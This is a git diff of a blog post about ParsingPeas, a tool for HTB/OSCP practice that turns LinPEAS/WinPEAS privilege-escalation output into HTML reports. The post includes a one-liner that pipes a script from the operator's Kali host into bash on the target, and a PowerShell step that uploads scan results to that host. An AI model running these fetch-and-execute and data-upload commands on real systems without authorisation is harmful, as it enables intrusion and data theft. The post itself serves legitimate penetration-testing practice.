@@ -14,26 +14,28 @@ tags:
 featured_image: /assets/images/parsingpeas-logo.png
 ---
 
-I got tired of manually transferring LinPEAS output between machines, so I built [ParsingPeas](https://github.com/YuvalMil/ParsingPeas). One command on the target, instant HTML report on your Kali box.
+I wasted 2 hours on extra enumeration because I missed a finding in WinPEAS output. That was the breaking point. I built [ParsingPeas](https://github.com/YuvalMil/ParsingPeas) to fix this.
 
 ## The Problem
 
-Running LinPEAS on multiple HTB boxes means:
-- Setting up HTTP servers
-- Copy-pasting thousands of lines of colored output
-- Losing track of which findings belong to which machine
-- Re-running scans because you forgot to save the output
+During OSCP prep, I was solving multiple boxes daily. The workflow sucked:
+- Transfer LinPEAS manually
+- Run the scan
+- Scroll through thousands of colored lines in the terminal
+- Miss important findings
+- Copy-paste output somewhere for later review
+- Lose track of which output belongs to which box
 
-It's tedious as hell.
+I actually tried another tool from GitHub that generates HTML reports, but it required multiple steps to get a working page. That defeated the purpose.
 
 ## The Solution
 
-On target:
+One command on target:
 ```bash
 curl -sSL http://YOUR_KALI_IP:8000/get-script | bash
 ```
 
-Done. LinPEAS runs, results automatically transfer back, HTML report generates with categorized findings.
+LinPEAS runs, results transfer automatically, HTML report generates. Done.
 
 ## How It Works
 
@@ -45,43 +47,36 @@ cd ParsingPeas
 python3 receiver.py
 ```
 
-The server:
-- Hosts LinPEAS/WinPEAS binaries
-- Serves wrapper scripts that handle execution and upload
-- Receives scan outputs
-- Parses results into categorized HTML
-- Shows all reports on a dashboard
-
 **Architecture:**
-- `receiver.py` - HTTP server
+- `receiver.py` - HTTP server that hosts binaries and receives results
 - `parser.py` - Parses ANSI output, categorizes findings
-- `wrapper.sh/ps1` - Runs scan, uploads results
+- `wrapper.sh/ps1` - Runs scan, uploads results automatically
 
-No internet needed on the target. Everything goes through your Kali box.
+Target doesn't need internet. Everything goes through your Kali box.
 
 ## Features
 
 **One-liner execution**
-No manual chmod, wget, execute, transfer bullshit.
+The whole point was making it actually worth using. One command, that's it.
 
-**HTML reports with:**
+**HTML reports:**
 - Categorized sections (SUID, Cron, Network, Passwords, etc.)
-- Preserved ANSI colors
-- Jump navigation
+- Preserved ANSI colors (hardest part to get right)
+- Jump navigation between sections
 - Full terminal view
 
 **Multi-session support**
-Run scans on multiple boxes simultaneously. Each gets its own report by hostname + timestamp.
+Each scan gets its own report by hostname + timestamp.
 
 **Sudo hang fix**
-LinPEAS hangs when it hits `sudo -l` without a password. The wrapper patches this:
+Discovered this while testing via SSH. LinPEAS would hang on `sudo -l` waiting for password. Wrapper patches it:
 ```bash
 alias sudo='sudo -n'
 export SUDO_ASKPASS=/bin/false
 ```
 
 **Works offline**
-Target only needs to reach your Kali box. Perfect for pivoted networks.
+Perfect for pivoted networks or isolated lab environments.
 
 ## Usage
 
@@ -115,32 +110,21 @@ curl -X POST \
 python3 parser.py /path/to/linpeas_output.txt
 ```
 
-## Why I Built This
+## Development
 
-During HTB sessions, I kept losing track of which LinPEAS output belonged to which machine. Copy-pasting terminal output into Obsidian was annoying and error-prone.
+This is my first real tool. I've written scripts and wrappers before, but never built something from scratch and released it.
 
-Built the first version in a few hours:
-- Basic HTTP server
-- Upload endpoint
-- File storage
+Had the idea for months but never felt like starting. Then I found myself scrolling through LinPEAS output in the terminal again and just decided I'm doing it.
 
-Added HTML parsing:
-- Regex-based section detection
-- Basic categorization
-- Preserved ANSI colors
+First version took a few hours but wasn't very good. Added HTML parsing, refined the categorization, got the colors right.
 
-Then community feedback:
-- WinPEAS support
-- Better sudo handling
-- Multi-session dashboard
-
-69 stars in under a week was unexpected. Apparently other people had the same annoyance.
+Posted on LinkedIn, got around 700 likes. The GitHub repo hit 69 stars in under a week. Honestly didn't expect that.
 
 ## Technical Notes
 
-### Parsing ANSI Output
+### ANSI Color Preservation
 
-LinPEAS uses ANSI escape codes for colors. Detecting and categorizing them:
+Hardest problem was keeping colors as close as possible to the original. I know how important color coding is for quickly spotting critical findings.
 
 ```python
 ansi_pattern = re.compile(r'\x1b\[[0-9;]*m')
@@ -155,7 +139,7 @@ categories = {
 }
 ```
 
-### WinPEAS
+### WinPEAS Support
 
 Windows has different encoding and header formats:
 
@@ -167,7 +151,11 @@ Invoke-RestMethod -Uri "http://$KaliIP:8000/upload" `
   -Body $output
 ```
 
-Parser detects WinPEAS headers using cyan+green ANSI patterns.
+## Current State
+
+It's working well enough for CTFs. Haven't gotten complaints yet, but I'm sure there are bugs waiting to be discovered as more people use it.
+
+Right now I'm focusing on OSWE prep, but I'll keep updating this. The TODO list is realistic - nothing crazy on there that I won't eventually implement.
 
 ## TODO
 
@@ -185,17 +173,6 @@ Parser detects WinPEAS headers using cyan+green ANSI patterns.
 - Dark theme
 - Bookmarks
 - Timeline view
-
-## Lessons
-
-**Build what you need**
-I made this for myself. That's why it actually works.
-
-**Simple UX matters**
-The one-liner was the most appreciated feature. No one reads docs.
-
-**Ship it**
-Almost didn't publish because "not perfect yet." 69 stars proved people want it as-is.
 
 ## Links
 
